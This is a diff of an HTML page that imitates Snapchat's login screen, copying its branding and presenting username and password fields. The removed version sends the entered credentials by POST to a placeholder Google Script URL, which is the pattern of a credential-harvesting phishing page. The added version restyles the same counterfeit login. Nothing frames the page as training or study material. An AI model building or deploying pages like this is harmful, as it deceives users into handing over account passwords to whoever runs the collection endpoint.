@@ -6,96 +6,107 @@
   <title>Snapchat</title>
 
   <!-- Favicon -->
-  <link rel="icon" href="1234.jpg" type="image/jpeg" />
+  <link rel="icon" href="snapchat-logo.jpeg" type="image/jpeg" />
 
-  <!-- Styling -->
+  <!-- Google Fonts (Snapchat uses Helvetica Neue, fallback to sans-serif) -->
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+  </style>
+
   <style>
     * {
-      box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      box-sizing: border-box;
     }
 
     body {
-      background-color: #fffc00;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      font-family: 'Inter', 'Helvetica Neue', sans-serif;
+      background-color: #FFFC00;
       height: 100vh;
-    }
-
-    .login-container {
-      background-color: white;
-      border-radius: 20px;
-      box-shadow: 0 0 30px rgba(0, 0, 0, 0.1);
-      padding: 40px 30px;
-      width: 320px;
-      text-align: center;
-    }
-
-    .logo {
-      margin-bottom: 25px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
     }
 
     .logo img {
-      width: 60px;
-      border-radius: 12px;
+      width: 80px;
+      height: 80px;
+      margin-bottom: 30px;
     }
 
-    h2 {
-      margin-bottom: 25px;
+    .login-container {
+      background: #fff;
+      padding: 40px 30px;
+      border-radius: 20px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+      width: 320px;
+    }
+
+    .login-container h1 {
       font-size: 24px;
       color: #000;
+      margin-bottom: 25px;
+      text-align: center;
     }
 
     input[type="text"],
     input[type="password"] {
       width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
-      border: 1px solid #ddd;
+      padding: 12px 15px;
+      margin-bottom: 18px;
+      border: 1px solid #ccc;
       border-radius: 10px;
-      font-size: 16px;
+      font-size: 14px;
     }
 
-    input[type="submit"] {
-      background-color: #fffc00;
-      border: none;
-      border-radius: 10px;
-      padding: 12px;
-      font-weight: bold;
-      font-size: 16px;
+    button {
       width: 100%;
+      background-color: #FFFC00;
+      color: #000;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 10px;
       cursor: pointer;
-      transition: background-color 0.3s;
+      transition: background 0.2s;
     }
 
-    input[type="submit"]:hover {
-      background-color: #e5da00;
+    button:hover {
+      background-color: #f2e900;
     }
 
-    .footer {
-      margin-top: 20px;
-      font-size: 12px;
-      color: #777;
+    .links {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 13px;
+    }
+
+    .links a {
+      color: #000;
+      text-decoration: none;
+      font-weight: 600;
     }
   </style>
 </head>
 <body>
 
+  <div class="logo">
+    <img src="snapchat-logo.jpeg" alt="Snapchat Logo" />
+  </div>
+
   <div class="login-container">
-    <div class="logo">
-      <img src="1234.jpg" alt="Snapchat Logo">
-    </div>
-    <h2>Log In to Snapchat</h2>
-    <form method="POST" action="YOUR_GOOGLE_SCRIPT_URL">
-      <input type="text" name="username" placeholder="Username or Email" required>
-      <input type="password" name="password" placeholder="Password" required>
-      <input type="submit" value="Log In">
+    <h1>Log In to Continue</h1>
+    <form>
+      <input type="text" placeholder="Username or Email" required />
+      <input type="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
     </form>
-    <div class="footer">
-      New to Snapchat? <a href="#">Sign up</a>
+    <div class="links">
+      <p><a href="#">Forgot Password?</a></p>
+      <p><a href="#">Sign Up</a> if you don't have an account</p>
     </div>
   </div>
 
